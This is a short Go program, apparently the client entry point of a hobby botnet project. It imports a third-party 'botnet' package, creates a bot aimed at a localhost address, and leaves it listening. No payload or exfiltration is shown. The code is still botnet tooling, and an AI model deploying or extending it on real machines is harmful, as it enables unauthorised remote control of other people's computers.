package main

import (
	"log"

	"github.com/rodzzlessa24/botnet"
)

func main() {
	sendData("127.0.0.1:7890")
}

func sendData(addr string) {
	bot, err := botnet.NewBot(addr)
	if err != nil {
		log.Fatal(err)
	}
	bot.Listen()
}
